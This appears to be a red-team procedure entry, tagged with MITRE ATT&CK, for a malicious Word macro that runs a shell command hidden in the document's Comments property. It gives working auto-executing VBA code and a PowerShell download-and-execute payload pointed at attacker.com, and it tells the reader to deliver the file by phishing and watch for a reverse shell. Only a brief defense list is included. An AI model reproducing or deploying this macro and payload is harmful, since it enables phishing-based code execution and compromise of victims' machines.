---
id: fcbde5b5-bba8-4894-955b-a9c0c067418a
name: Execute-Shell-Command-via-VBA-Comment-Metadata
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:23.500717+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/User Execution|T1204 - User Execution]]'
sub_techniques:
  - '[[sub-techniques/Malicious File|T1204.002 - Malicious File]]'
tags:
  - '[[tags/DOCM - VBA Shell Execute Comment]]'
  - '[[tags/Office - Attacks]]'
  - vba-macro
  - malicious-document
commands: []
platforms:
  - Windows
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Execute-Shell-Command-via-VBA-Comment-Metadata

## Summary

This procedure uses a malicious VBA macro embedded in an Office document to execute arbitrary shell commands stored in the document's comment metadata. When the victim opens the macro-enabled document, the macro automatically triggers and runs the command via the Windows Shell function, enabling code execution without additional user interaction beyond opening the file. This technique is effective in phishing campaigns targeting Office users.

## Description

The technique exploits VBA's ability to access built-in document properties, specifically the 'Comments' field, to retrieve and execute a payload as a shell command. The macro includes AutoExec and AutoOpen event handlers to ensure execution upon document opening or macro invocation. This allows attackers to deliver payloads like reverse shells or data exfiltration scripts hidden in metadata, bypassing some macro security checks. It targets Microsoft Office on Windows environments where macros are enabled, and is particularly useful for initial access in social engineering attacks. Success relies on the victim enabling macros, leading to command execution in the context of the user's privileges.

## Requirements

1. Microsoft Office (Word or Excel) installed on a Windows target system.
2. Macro-enabled document format (.docm or .xlsm) with VBA editor access for implementation.
3. Knowledge of VBA scripting to embed and customize the macro.
4. A shell command payload (e.g., PowerShell script or executable invocation) to store in the document's Comments property.
5. Victim must have macros enabled or be tricked into enabling them.

## Defense

Defensive measures and detection strategies:

- Disable macros by default in Office applications and only enable for trusted sources.
- Use Group Policy to block VBA macro execution from the internet or untrusted locations.
- Implement endpoint detection and response (EDR) tools to monitor for suspicious Shell API calls from Office processes.
- Enable Office macro logging and antivirus scanning for macro-enabled files.
- Educate users on phishing risks and the dangers of enabling macros in unsolicited documents.

## Objectives

1. Achieve code execution on the victim's machine by leveraging document metadata.
2. Gain initial foothold for further post-exploitation activities, such as data theft or persistence.
3. Evade detection by hiding the payload in non-obvious metadata fields rather than the macro code itself.

## Instructions

### Step 1: Create and Embed the VBA Macro

**Context**: Open the VBA editor in Microsoft Word or Excel to insert the macro code that will read and execute the comment metadata. This sets up the automatic execution triggers.

**Code** ([[codes/VBA-Macro-for-Shell-Execution-via-Comments]]):

```vb
Sub beautifulcomment()
    Dim p As DocumentProperty
    For Each p In ActiveDocument.BuiltInDocumentProperties
        If p.Name = "Comments" Then
            Shell (p.Value)
        End If
    Next
End Sub

Sub AutoExec()
    beautifulcomment
End Sub

Sub AutoOpen()
    beautifulcomment
End Sub
```

> The 'beautifulcomment' subroutine iterates through the document's built-in properties, identifies the 'Comments' field, and executes its value using the Shell function. AutoExec and AutoOpen ensure the subroutine runs automatically when the document is opened or the macro is executed. Save the document as a macro-enabled file (.docm).

### Step 2: Set the Malicious Payload in Comments Metadata

**Context**: Add the desired shell command to the document's Comments property via the Properties dialog (File > Info > Properties > Advanced Properties > Summary tab). This hides the payload in metadata, which is not visible to the user by default.

> Example payload: `powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"`. This downloads and executes a remote PowerShell script. Ensure the command is a valid Windows shell invocation to avoid errors.

### Step 3: Test and Deliver the Document

**Context**: Verify the macro executes correctly in a controlled environment before delivery. Test by opening the document and checking if the shell command runs (e.g., monitor for network connections or file creation).

> Deliver via phishing email attachment. Upon opening, if macros are enabled, the command in Comments will execute silently. Monitor for success via callback in the payload (e.g., reverse shell connection).

**Expected Output**: The shell command executes without errors, potentially spawning a new process (visible in Task Manager) or producing network activity if the payload includes remote connections.

### Step 4: Verify Execution

**Context**: Confirm success by checking for payload effects, such as a reverse shell connection or file drop.

> Use tools like netstat or ProcMon on the target to observe spawned processes from winword.exe or excel.exe calling cmd.exe/shell.
